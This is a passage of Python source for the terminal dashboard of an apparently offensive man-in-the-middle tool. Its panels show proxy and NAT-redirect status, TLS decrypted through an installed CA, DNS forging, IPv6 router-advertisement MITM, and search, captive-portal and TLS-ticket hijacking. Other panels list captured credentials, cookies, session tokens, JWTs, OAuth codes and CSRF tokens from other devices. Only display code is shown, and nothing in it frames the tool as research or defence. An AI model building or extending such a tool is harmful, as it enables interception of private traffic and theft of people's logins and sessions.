                  "[green]RUNNING[/]" if MITM_PROXY.running
                  else "[red]stopped[/]")
        t.add_row("HTTP listen", f"0.0.0.0:{MITM_PROXY.http_port}")
        t.add_row("HTTPS listen", f"0.0.0.0:{MITM_PROXY.https_port}")
        t.add_row("HTTP NAT redirect",
                  f":80 → :{MITM_PROXY.http_port}"
                  if CONFIG.get("proxy_nat_http") else "off")
        t.add_row("HTTPS NAT redirect",
                  f":443 → :{MITM_PROXY.https_port}"
                  if CONFIG.get("proxy_nat_https") else "off")
        t.add_row("QUIC block",
                  "on" if CONFIG.get("mitm_quic_block") else "off")
        t.add_row("DoH block",
                  "on" if CONFIG.get("mitm_doh_block") else "off")
        t.add_row("CA cert", str(MITM_PROXY._ca_cert))
        t.add_row("nat rules installed",
                  str(len(MITM_PROXY._iptables_rules)))
        with STATE.lock:
            ps = dict(STATE.proxy_stats)
        t.add_row("HTTP flows done", str(ps.get("http", 0)))
        t.add_row("HTTPS flows done", str(ps.get("https", 0)))
        t.add_row("active flows", str(ps.get("active", 0)))
        t.add_row("pinned rejects", str(ps.get("pinned", 0)))
        t.add_row("errors", str(ps.get("errors", 0)))
        t.add_row("bytes in", pretty_bytes(ps.get("bytes_in", 0)))
        t.add_row("bytes out", pretty_bytes(ps.get("bytes_out", 0)))
    else:
        t.add_row("proxy status", "[dim]not started[/]")
        t.add_row("hint",
                  "[dim]enable with --mitm-mode B|C or at prompt[/]")
    return Panel(t, title="[bold magenta]MITM PROXY[/]", border_style="magenta")

def panel_mitm_flows():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Client", ratio=2)
    t.add_column("Target", ratio=3); t.add_column("Mode", width=6)
    t.add_column("In/Out", width=14); t.add_column("Detail", ratio=3)
    with STATE.lock: flows = list(STATE.mitm_flows)[-80:]
    for row in reversed(flows):
        try:
            (ts, src, dst, sport, dport, proto, sni, host, method, path,
             status, bi, bo, mode, outcome) = row
        except Exception:
            continue
        tstr = datetime.fromtimestamp(ts).strftime("%H:%M:%S")
        target = sni or host or dst
        io = f"{pretty_bytes(bi)}/{pretty_bytes(bo)}"
        detail = ""
        if method: detail = f"{method} {str(path)[:40]}"
        elif sni: detail = f"SNI {str(sni)[:40]}"
        mode_color = "green" if mode == "http" else "cyan"
        t.add_row(tstr, _tagged_ip(src, True),
                  str(target)[:40],
                  f"[{mode_color}]{mode}[/]",
                  io, detail[:60])
    if not flows:
        t.add_row("[dim]—[/]", "[dim]no proxy flows yet[/]", "[dim]—[/]",
                  "[dim]—[/]", "[dim]—[/]", "[dim]waiting…[/]")
    with STATE.lock:
        n = len(STATE.mitm_flows)
    return Panel(t, title=f"[bold magenta]MITM FLOWS[/] [dim]({n})[/]",
                 border_style="magenta")

def panel_mitm_pins():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Client", ratio=2)
    t.add_column("SNI", ratio=3); t.add_column("Reason", ratio=3)
    with STATE.lock: pins = list(STATE.mitm_pins)[-60:]
    for ts, src, sni, reason in reversed(pins):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  _tagged_ip(src, True), str(sni)[:50], str(reason)[:80])
    if not pins:
        t.add_row("[dim]—[/]", "[dim]no pinned clients[/]", "[dim]—[/]",
                  "[dim]—[/]")
    with STATE.lock:
        n = len(STATE.mitm_pins)
    return Panel(t, title=f"[bold red]MITM PINS[/] "
                          f"[dim]({n} cert-pinned clients)[/]",
                 border_style="red")

def panel_mitm_errors():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Error", ratio=5)
    with STATE.lock: errs = list(STATE.mitm_errors)[-60:]
    for ts, msg in reversed(errs):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(msg)[:160])
    if not errs:
        t.add_row("[dim]—[/]", "[dim]no errors[/]")
    return Panel(t, title="[bold red]MITM ERRORS[/]", border_style="red")

def panel_proxy_flows():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Src", ratio=2)
    t.add_column("Dst", ratio=3); t.add_column("Mode", width=6)
    t.add_column("Outcome", ratio=2)
    with STATE.lock: flows = list(STATE.proxy_flows)[-50:]
    for rec in reversed(flows):
        ts = rec.get("ts", time.time())
        src = rec.get("src", "?")
        dst = rec.get("dst", "?")
        mode = rec.get("mode", "?")
        outcome = rec.get("outcome", "?")
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  _tagged_ip(src, True), str(dst)[:40], mode, outcome)
    if not flows:
        t.add_row("[dim]—[/]", "[dim]no completed proxy flows[/]",
                  "[dim]—[/]", "[dim]—[/]", "[dim]—[/]")
    return Panel(t, title="[bold magenta]PROXY FLOWS[/]",
                 border_style="magenta")

def panel_doh_blocks():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Event", ratio=5)
    with STATE.lock: ev = list(STATE.doh_blocks)[-30:]
    for ts, msg in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(msg)[:160])
    if not ev:
        t.add_row("[dim]—[/]", "[dim]DoH block list empty[/]")
    return Panel(t, title="[bold red]DOH BLOCKS[/]", border_style="red")

def panel_ipv6_mitm():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Event", ratio=5)
    with STATE.lock: ev = list(STATE.ipv6_mitm)[-30:]
    for ts, msg in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(msg)[:160])
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no IPv6 MITM events[/]")
    return Panel(t, title="[bold magenta]IPV6 MITM (RA lifetime=0)[/]",
                 border_style="magenta")

def panel_sessions():
    t = _base_table()
    t.add_column("Device", ratio=2); t.add_column("Apps / Service", ratio=3)
    t.add_column("Activity", width=18)
    t.add_column("Rate", width=20, justify="right")
    t.add_column("Age", width=6, justify="right")
    devs = _count_real_devices()
    def _key(d):
        if _is_me(d.ip): return (0, -d.bytes)
        if _is_gw(d.ip): return (1, -d.bytes)
        return (2, -d.bytes)
    devs.sort(key=_key)
    now = time.time()
    for d in devs[:200]:
        try:
            svc, act, rate = classify_activity(d)
            up, down = _device_rate(d)[:2]
        except Exception:
            svc, act, rate, up, down = ("(err)", "[red]err[/]", 0, 0, 0)
        dev_disp = _tagged_ip(d.ip, True)
        up_s = pretty_bytes(up) + "/s" if up > 1 else ""
        down_s = pretty_bytes(down) + "/s" if down > 1 else ""
        rate_str = f"↑{up_s} ↓{down_s}".strip() or "—"
        age_str = _fmt_age(now - d.last_seen)
        top_apps = _top_apps(d, n=2)
        app_labels = [f"{a}×{int(w)}" if w >= 2 else a
                      for a, w in top_apps] or [svc[:40] if svc else "(no dns)"]
        svc_disp = " • ".join(app_labels)
        t.add_row(dev_disp, svc_disp, act, rate_str, age_str)
    if not devs:
        t.add_row("[dim]—[/]", "[dim]waiting…[/]",
                  *([" "] * (len(t.columns) - 2)))
    return Panel(t, title=f"[bold green]ACTIVE SESSIONS[/] "
                          f"[dim]({len(devs)})[/]",
                 border_style="green")

def panel_software_stack():
    W = _term_width(); t = _base_table()
    if W >= 150:
        t.add_column("Device", ratio=2); t.add_column("Stack", width=20)
        t.add_column("JA3", ratio=2); t.add_column("JA4", ratio=3)
        t.add_column("JA4S", ratio=3); t.add_column("JA4H", ratio=3)
        t.add_column("JA4X", ratio=2); t.add_column("JA4SSH", width=18)
    else:
        t.add_column("Device", ratio=2); t.add_column("Stack", width=16)
        t.add_column("JA3/JA4/JA4S/JA4H", ratio=4)
    devs = _count_real_devices()
    def _key(d):
        if _is_me(d.ip): return (0, -d.bytes)
        if _is_gw(d.ip): return (1, -d.bytes)
        return (2, -d.bytes)
    devs.sort(key=_key)
    devs = [d for d in devs
            if d.ja3 or d.ja4 or d.ja4s or d.ja4h or d.ja4x or d.ja4ssh
            or d.ua_browser or d.ua_bot or d.dhcp_fp]
    for d in devs[:200]:
        dev_disp = _tagged_ip(d.ip, True); stack = _stack_label(d)
        ja3 = list(d.ja3.keys())[-1] if d.ja3 else ""
        ja4 = list(d.ja4.values())[-1] if d.ja4 else ""
        ja4s = list(d.ja4s.values())[-1] if d.ja4s else ""
        ja4h = list(d.ja4h.values())[-1] if d.ja4h else ""
        ja4x = list(d.ja4x.values())[-1] if d.ja4x else ""
        ja4ssh = list(d.ja4ssh.values())[-1] if d.ja4ssh else ""
        if W >= 150:
            t.add_row(dev_disp, stack, ja3, ja4, ja4s, ja4h, ja4x, ja4ssh)
        else:
            combo = f"{ja3} | {ja4} | {ja4s} | {ja4h}"
            t.add_row(dev_disp, stack, combo)
    if not devs:
        t.add_row("[dim]—[/]", "[dim]waiting…[/]",
                  *([" "] * (len(t.columns) - 2)))
    total_fp = sum(len(d.ja3) + len(d.ja4) + len(d.ja4s) + len(d.ja4h)
                    + len(d.ja4x) + len(d.ja4ssh)
                    for d in devs)
    return Panel(t, title=f"[bold cyan]SOFTWARE STACK[/] "
                          f"[dim]({len(devs)} dev, {total_fp} fp)[/]",
                 border_style="cyan")

def _ja_panel(kind, title):
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Device", ratio=2)
    t.add_column("Dst", ratio=2); t.add_column("Value", ratio=5)
    with STATE.lock: ev = list(STATE.ja4_events)[-100:]
    rows = []
    for ts, src, dst, sp, dp, k, value in ev:
        if k != kind: continue
        try: v = json.loads(value) if isinstance(value, str) else value
        except Exception: v = value
        first = next(iter(v.values()), "") if isinstance(v, dict) else v
        rows.append((ts, src, dst, first))
    for ts, src, dst, val in reversed(rows):
        tstr = datetime.fromtimestamp(ts).strftime("%H:%M:%S")
        t.add_row(tstr, _tagged_ip(src, True), _tagged_ip(dst, True),
                  str(val)[:140])
    if not rows:
        t.add_row("[dim]—[/]", "[dim]waiting…[/]",
                  *([" "] * (len(t.columns) - 2)))
    return Panel(t, title=title, border_style="cyan")

def panel_ja3():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Device", ratio=2)
    t.add_column("JA3", width=34); t.add_column("Label", ratio=2)
    t.add_column("Raw", ratio=3)
    with STATE.lock: ev = list(STATE.ja3_events)[-100:]
    for ts, src, dst, sp, dp, digest, raw in reversed(ev):
        label = _JA3_DB.get(digest, ("", ""))[0]
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  _tagged_ip(src, True), digest[:32],
                  str(label)[:40], raw[:100])
    if not ev:
        t.add_row("[dim]—[/]", "[dim]waiting…[/]",
                  *([" "] * (len(t.columns) - 2)))
    return Panel(t, title=f"[bold blue]JA3 CLIENT[/] "
                          f"[dim]({len(_JA3_DB)} labels)[/]",
                 border_style="blue")

def panel_ja3s():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Device", ratio=2)
    t.add_column("JA3S", width=34); t.add_column("Raw", ratio=4)
    with STATE.lock: ev = list(STATE.ja3_events)[-100:]
    for ts, src, dst, sp, dp, digest, raw in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  _tagged_ip(src, True), digest[:32], raw[:120])
    if not ev:
        t.add_row("[dim]—[/]", "[dim]waiting…[/]",
                  *([" "] * (len(t.columns) - 2)))
    return Panel(t, title="[bold blue]JA3S SERVER[/]", border_style="blue")

def panel_ja4():     return _ja_panel("ja4",    "[bold cyan]JA4 CLIENT[/]")
def panel_ja4s():    return _ja_panel("ja4s",   "[bold cyan]JA4S SERVER[/]")
def panel_ja4h():    return _ja_panel("ja4h",   "[bold cyan]JA4H HTTP[/]")
def panel_ja4x():    return _ja_panel("ja4x",   "[bold cyan]JA4X CERT[/]")
def panel_ja4ssh():  return _ja_panel("ja4ssh", "[bold cyan]JA4SSH[/]")

def panel_ja4_known():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Device", ratio=2)
    t.add_column("SNI", ratio=2); t.add_column("Match", ratio=3)
    t.add_column("Kind", width=8)
    with STATE.lock: ev = list(STATE.ja4_known_hits)[-80:]
    for ts, src, sni, match, is_bot in reversed(ev):
        kind = "[red]bot[/]" if is_bot else "[green]browser[/]"
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  _tagged_ip(src, True), str(sni)[:40],
                  str(match)[:60], kind)
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no high-confidence matches[/]",
                  "[dim]—[/]", "[dim]—[/]", "[dim]—[/]")
    return Panel(t, title=f"[bold cyan]JA4 KNOWN ({len(JA4_KNOWN)} entries)[/]",
                 border_style="cyan")

def panel_ja4_fingerprints():
    t = _base_table()
    t.add_column("Prefix", width=14); t.add_column("b", width=14)
    t.add_column("c", width=14); t.add_column("Name", ratio=3)
    t.add_column("Type", width=8)
    for e in JA4_KNOWN:
        kind = "[green]browser[/]" if e["type"] == "browser" else "[red]bot[/]"
        t.add_row(e["prefix"], e["b"], e["c"], e["name"], kind)
    return Panel(t, title="[bold cyan]JA4 DATABASE[/]", border_style="cyan")

def panel_oui():
    t = _base_table()
    t.add_column("Prefix", width=10); t.add_column("Vendor", ratio=4)
    items = sorted(_OUI_VENDORS.items())[:60]
    for pre, ven in items:
        t.add_row(pre, ven[:80])
    if not items:
        t.add_row("[dim]—[/]", "[dim]master_oui.txt not loaded[/]")
    return Panel(t, title=f"[bold cyan]OUI VENDORS ({len(_OUI_VENDORS)})[/]",
                 border_style="cyan")

def panel_ua():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Device", ratio=2)
    t.add_column("Kind", width=10); t.add_column("UA", ratio=5)
    with STATE.lock: ev = list(STATE.ua_hits)[-50:]
    for ts, src, ua, is_browser, is_bot in reversed(ev):
        kind = "[cyan]browser[/]" if is_browser else \
               ("[red]bot[/]" if is_bot else "[dim]?[/]")
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  _tagged_ip(src, True), kind, str(ua)[:140])
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no UA captured[/]", "[dim]—[/]",
                  "[dim]—[/]")
    return Panel(t, title=f"[bold cyan]USER-AGENT DB "
                          f"({len(_UA_DB['browsers'])} profiles)[/]",
                 border_style="cyan")

def panel_dhcp_fp():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("MAC", ratio=2)
    t.add_column("Fingerprint", ratio=4)
    with STATE.lock: ev = list(STATE.dhcp_fp_hits)[-50:]
    for ts, mac, fp in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"), mac,
                  str(fp)[:120])
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no DHCP fingerprints[/]", "[dim]—[/]")
    return Panel(t, title="[bold]DHCP FINGERPRINTS[/]", border_style="cyan")

def panel_identity():
    t = _base_table()
    t.add_column("Device", ratio=2); t.add_column("Stack", ratio=3)
    t.add_column("State", width=12); t.add_column("Policy", ratio=2)
    t.add_column("Services", ratio=4)
    for d in _count_real_devices()[:15]:
        t.add_row(_tagged_ip(d.ip, True), _stack_label(d), d.state, d.policy,
                  ",".join(sorted(d.services))[:160])
    return Panel(t, title="[bold]DEVICE IDENTITY[/]", border_style="cyan")

def panel_intent():
    t = _base_table()
    t.add_column("Device", ratio=2); t.add_column("Intent", width=14)
    t.add_column("Top site", ratio=4)
    for d in _count_real_devices()[:15]:
        try:
            svc, act, rate = classify_activity(d)
        except Exception:
            svc, act, rate = ("(err)", "[red]err[/]", 0)
        intent = INTENT_MGR.classify(d, svc, act, rate) if INTENT_MGR else "?"
        t.add_row(_tagged_ip(d.ip, True), intent, (svc or "")[:120])
    return Panel(t, title="[bold]INTENT CLASSIFICATION[/]", border_style="cyan")

def panel_tokens():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Device", ratio=2)
    t.add_column("Kind", width=18); t.add_column("Value", ratio=4)
    with STATE.lock: toks = list(STATE.tokens)[-50:]
    for ts, dev, kind, val in reversed(toks):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(dev)[:24], kind, str(val)[:120])
    if not toks:
        t.add_row("[dim]—[/]", "[dim]no tokens[/]", "[dim]—[/]", "[dim]—[/]")
    return Panel(t, title="[bold]TOKEN VAULT[/]", border_style="magenta")

def panel_credentials():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Host", ratio=2)
    t.add_column("Value", ratio=5)
    with STATE.lock: cr = list(STATE.credentials)[-50:]
    for ts, host, body in reversed(cr):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(host)[:40], str(body)[:200])
    if not cr:
        t.add_row("[dim]—[/]", "[dim]no credentials[/]", "[dim]—[/]")
    return Panel(t, title="[bold red]CREDENTIALS[/]", border_style="red")

def panel_proto_creds():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Proto", width=8)
    t.add_column("Field", width=10); t.add_column("Value", ratio=4)
    with STATE.lock: ev = list(STATE.proto_creds)[-50:]
    for ts, proto, key, field, value in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  proto, field, str(value)[:150])
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no proto creds[/]", "[dim]—[/]",
                  "[dim]—[/]")
    return Panel(t, title="[bold red]PROTOCOL CREDENTIALS[/]",
                 border_style="red")

def panel_cookies():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Host", ratio=2)
    t.add_column("Name", ratio=2); t.add_column("Direction", width=6)
    t.add_column("Value", ratio=4)
    with STATE.lock: ck = list(STATE.cookies)[-50:]
    for ts, host, name, value, direction in reversed(ck):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(host)[:40], str(name)[:30], direction,
                  str(value)[:120])
    if not ck:
        t.add_row("[dim]—[/]", "[dim]no cookies[/]", "[dim]—[/]",
                  "[dim]—[/]", "[dim]—[/]")
    return Panel(t, title="[bold yellow]COOKIES[/]", border_style="yellow")

def panel_cookie_jar():
    t = _base_table()
    t.add_column("Host", ratio=2); t.add_column("Cookies", ratio=5)
    with STATE.lock: jar = dict(STATE.cookie_jar)
    for host, cookies in list(jar.items())[-20:]:
        names = ", ".join(list(cookies.keys())[:6])
        t.add_row(str(host)[:40], names[:180])
    if not jar:
        t.add_row("[dim]—[/]", "[dim]cookie jar empty[/]")
    return Panel(t, title="[bold yellow]COOKIE JAR[/]", border_style="yellow")

def panel_cookie_graph():
    t = _base_table()
    t.add_column("Host", ratio=3); t.add_column("Cookies", ratio=4)
    with STATE.lock: g = dict(STATE.cookie_graph)
    for host, names in list(g.items())[-20:]:
        t.add_row(str(host)[:60], ", ".join(list(names)[:10])[:120])
    if not g:
        t.add_row("[dim]—[/]", "[dim]empty graph[/]")
    return Panel(t, title="[bold]COOKIE SCOPE GRAPH[/]", border_style="cyan")

def panel_jwts():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Host", ratio=2)
    t.add_column("Sub", ratio=2); t.add_column("Exp", width=12)
    with STATE.lock: jw = list(STATE.jwts)[-50:]
    for ts, host, jwt, raw in reversed(jw):
        payload = jwt.get("payload", {})
        sub = payload.get("sub",
                          payload.get("username",
                                       payload.get("email", "?")))
        exp = payload.get("exp", "?")
        if isinstance(exp, (int, float)):
            exp = datetime.fromtimestamp(exp).strftime("%Y-%m-%d %H:%M")
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(host)[:40], str(sub)[:40], str(exp))
    if not jw:
        t.add_row("[dim]—[/]", "[dim]no JWTs[/]", "[dim]—[/]", "[dim]—[/]")
    return Panel(t, title="[bold magenta]JWT DECODED[/]",
                 border_style="magenta")

def panel_oauth():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Host", ratio=2)
    t.add_column("Code", ratio=3); t.add_column("State", ratio=2)
    with STATE.lock: oa = list(STATE.oauth_flows)[-50:]
    for ts, host, code, state, method in reversed(oa):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(host)[:40], str(code)[:80], str(state)[:40])
    if not oa:
        t.add_row("[dim]—[/]", "[dim]no OAuth flows[/]", "[dim]—[/]",
                  "[dim]—[/]")
    return Panel(t, title="[bold cyan]OAUTH FLOWS[/]", border_style="cyan")

def panel_csrf():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Host", ratio=2)
    t.add_column("Field", ratio=2); t.add_column("Value", ratio=3)
    with STATE.lock: ev = list(STATE.csrf_tokens)[-50:]
    for ts, host, field, value in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(host)[:40], str(field)[:40], str(value)[:80])
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no CSRF tokens[/]", "[dim]—[/]",
                  "[dim]—[/]")
    return Panel(t, title="[bold cyan]CSRF TOKENS[/]", border_style="cyan")

def panel_forms():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Host", ratio=2)
    t.add_column("Fields", ratio=5)
    with STATE.lock: fr = list(STATE.forms)[-50:]
    for ts, host, fields in reversed(fr):
        if isinstance(fields, list):
            names = ", ".join(str(f.get("field", "?"))[:20]
                               for f in fields[:8])
        else:
            names = str(fields)[:160]
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(host)[:40], names[:200])
    if not fr:
        t.add_row("[dim]—[/]", "[dim]no forms[/]", "[dim]—[/]")
    return Panel(t, title="[bold cyan]FORM FIELDS[/]", border_style="cyan")

def panel_bodies():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Key", ratio=2)
    t.add_column("Path", ratio=3); t.add_column("Size", width=8)
    with STATE.lock: bods = list(STATE.bodies)[-50:]
    for ts, key, path, ln, preview in reversed(bods):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(key)[:40], str(path)[:80], str(ln))
    if not bods:
        t.add_row("[dim]—[/]", "[dim]no bodies[/]", "[dim]—[/]", "[dim]—[/]")
    return Panel(t, title="[bold]HTTP BODIES[/]", border_style="cyan")

def panel_http_requests():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Host", ratio=2)
    t.add_column("Method", width=8); t.add_column("Path", ratio=4)
    with STATE.lock: ev = list(STATE.http_requests)[-50:]
    for r in reversed(ev):
        t.add_row(datetime.fromtimestamp(r["ts"]).strftime("%H:%M:%S"),
                  str(r.get("host", ""))[:40], r.get("method", ""),
                  str(r.get("path", ""))[:120])
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no requests[/]", "[dim]—[/]",
                  "[dim]—[/]")
    return Panel(t, title="[bold green]HTTP REQUESTS[/]",
                 border_style="green")

def panel_http_responses():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Status", width=8)
    t.add_column("Key", ratio=3); t.add_column("Len", width=8)
    with STATE.lock: ev = list(STATE.http_responses)[-50:]
    for r in reversed(ev):
        t.add_row(datetime.fromtimestamp(r["ts"]).strftime("%H:%M:%S"),
                  str(r.get("status", 0)), str(r.get("key", ""))[:80],
                  str(len(r.get("body", b""))))
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no responses[/]", "[dim]—[/]",
                  "[dim]—[/]")
    return Panel(t, title="[bold green]HTTP RESPONSES[/]",
                 border_style="green")

def panel_tls_decrypted():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Client", ratio=2)
    t.add_column("SNI", ratio=3); t.add_column("Dir", width=6)
    t.add_column("Bytes", width=8)
    with STATE.lock: ev = list(STATE.tls_decrypted)[-50:]
    for ts, ip, sni, direction, n in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(ip)[:40], str(sni)[:60], direction, str(n))
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no TLS sessions[/]", "[dim]—[/]",
                  "[dim]—[/]", "[dim]—[/]")
    return Panel(t, title="[bold yellow]TLS DECRYPTED (via CA)[/]",
                 border_style="yellow")

def panel_dns_policy():
    t = _base_table()
    t.add_column("Pattern", ratio=2); t.add_column("Response", ratio=2)
    t.add_column("Kind", width=10)
    if DNS_FORGE:
        for r in DNS_FORGE.rules[-20:]:
            t.add_row(r["pattern"], str(r["response"]), r["kind"])
    if not (DNS_FORGE and DNS_FORGE.rules):
        t.add_row("[dim](no rules)[/]", "[dim]—[/]", "[dim]—[/]")
    return Panel(t, title="[bold]DNS POLICY ENGINE[/]", border_style="yellow")

def panel_search_hijack():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Device", ratio=2)
    t.add_column("Query", ratio=4)
    with STATE.lock: hits = list(STATE.search_hits)[-50:]
    for ts, dev, dom in reversed(hits):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  _tagged_ip(dev, True), str(dom)[:120])
    if not hits:
        t.add_row("[dim]—[/]", "[dim]no searches[/]", "[dim]—[/]")
    return Panel(t, title="[bold]SEARCH HIJACK LOG[/]", border_style="cyan")

def panel_captive_hijack():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Device", ratio=2)
    t.add_column("Channel", width=10); t.add_column("Detail", ratio=3)
    with STATE.lock: hits = list(STATE.captive_hits)[-50:]
    for ts, dev, ch, det in reversed(hits):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  _tagged_ip(dev, True), ch, str(det)[:120])
    if not hits:
        t.add_row("[dim]—[/]", "[dim]no captive probes[/]", "[dim]—[/]",
                  "[dim]—[/]")
    return Panel(t, title="[bold]CAPTIVE PORTAL HIJACK[/]",
                 border_style="cyan")

def panel_notify():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Device", ratio=2)
    t.add_column("Channel", ratio=4)
    with STATE.lock:
        p = list(STATE.portal_hits)[-20:]
        s = list(STATE.smb_msgs)[-20:]
        m = list(STATE.mdns_renames)[-20:]
    for ts, dev, data in reversed(p):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  _tagged_ip(dev, True), "portal")
    for ts, dev, text in reversed(s):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  _tagged_ip(dev, True), f"SMB: {text[:60]}")
    for ts, hostname, name in reversed(m):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  hostname, f"mDNS rename → {name}")
    if not (p or s or m):
        t.add_row("[dim]—[/]", "[dim]no notifications[/]", "[dim]—[/]")
    return Panel(t, title="[bold]DEVICE NOTIFICATIONS[/]", border_style="cyan")

def panel_portal():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Client", ratio=2)
    t.add_column("First bytes", ratio=4)
    with STATE.lock: hits = list(STATE.portal_hits)[-50:]
    for ts, dev, data in reversed(hits):
        try: preview = data.decode("utf-8", "ignore")[:100]
        except Exception: preview = str(data)[:100]
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  _tagged_ip(dev, True), preview)
    if not hits:
        t.add_row("[dim]—[/]", "[dim]no portal hits[/]", "[dim]—[/]")
    return Panel(t, title="[bold]CAPTIVE PORTAL LOG[/]", border_style="cyan")

def panel_tls_hijack():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Device", ratio=2)
    t.add_column("SNI", ratio=3)
    with STATE.lock: hits = list(STATE.session_tickets.items())[-20:]
    if not hits:
        t.add_row("[dim]—[/]", "[dim]no tickets[/]", "[dim]—[/]")
        return Panel(t, title="[bold]TLS HIJACK (TICKET REUSE)[/]",
                     border_style="cyan")
    for ip, lst in hits:
        for ts, sni, _tk in lst[-3:]:
            t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                      _tagged_ip(ip, True), str(sni)[:120])
    return Panel(t, title="[bold]TLS HIJACK (TICKET REUSE)[/]",
                 border_style="cyan")

def panel_tcp_fork():
    t = _base_table()
    t.add_column("Stream", ratio=2); t.add_column("Seq", width=12)
    t.add_column("Ack", width=12); t.add_column("Win", width=8)
    if TCP_FORK:
        with TCP_FORK._lock:
            for k, v in list(TCP_FORK.streams.items())[:15]:
                t.add_row(f"{k[0]}:{k[1]}->{k[2]}:{k[3]}",
                          str(v["last_seq"]), str(v["last_ack"]),
                          str(v["win"]))
    if not (TCP_FORK and TCP_FORK.streams):
        t.add_row("[dim]—[/]", "[dim]waiting…[/]", "[dim]—[/]", "[dim]—[/]")
    return Panel(t, title="[bold]TCP FORK STATE[/]", border_style="cyan")

def panel_h2_hpack():
    t = _base_table()
    t.add_column("Stream", ratio=2); t.add_column("Idx", width=8)
    t.add_column("Name", ratio=3)
    with STATE.lock: hp = list(STATE.hpack_state.items())[-15:]
    for stream, tbl in hp:
        for idx, name in list(tbl.items())[:3]:
            t.add_row(str(stream), str(idx), str(name)[:80])
    if not hp:
        t.add_row("[dim]—[/]", "[dim]no HPACK state[/]", "[dim]—[/]")
    return Panel(t, title="[bold]H2 / HPACK MIRROR[/]", border_style="cyan")

def panel_h2_frames():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Stream", ratio=3)
    t.add_column("Frames", ratio=3)
    with STATE.lock: ev = list(STATE.h2_frames)[-50:]
    for ts, key, frames in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(key)[:60], str(frames[:5])[:100])
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no H2 frames[/]", "[dim]—[/]")
    return Panel(t, title="[bold]H2 FRAMES[/]", border_style="cyan")

def panel_ws_splice():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Stream", ratio=2)
    t.add_column("Op", width=6); t.add_column("Len", width=8)
    with STATE.lock: ev = list(STATE.ws_ops)[-50:]
    for ts, stream, op, ln in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(stream), str(op), str(ln))
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no WS frames[/]", "[dim]—[/]",
                  "[dim]—[/]")
    return Panel(t, title="[bold]WEBSOCKET SPLICE[/]", border_style="cyan")

def panel_ws_ctrl():
    t = _base_table()
